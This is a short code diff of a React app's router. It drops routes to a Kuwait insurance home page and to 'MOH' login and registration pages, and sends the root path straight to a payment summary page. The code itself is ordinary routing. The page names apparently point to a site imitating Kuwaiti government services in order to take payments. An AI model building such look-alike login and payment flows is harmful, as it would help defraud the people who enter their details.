@@ -39,14 +39,8 @@ import FinalPage from "./pages/FinalPage";
 function Router() {
   return (
     <Switch>
-      {/* Main Pages */}
-      <Route path={"/"} component={KuwaitInsuranceHome} />
-      <Route path={"/moh-login"} component={MOHLogin} />
-      <Route path={"/moh-register"} component={MOHRegister} />
-      <Route path={"/moh-create-account"} component={MOHCreateAccount} />
-
-
-      {/* Form Routes */}
+      {/* Main Page - Direct to Summary Payment */}
+      <Route path={"/"} component={SummaryPayment} />
       <Route path={"/summary-payment"} component={SummaryPayment} />
 
       {/* Payment Routes */}
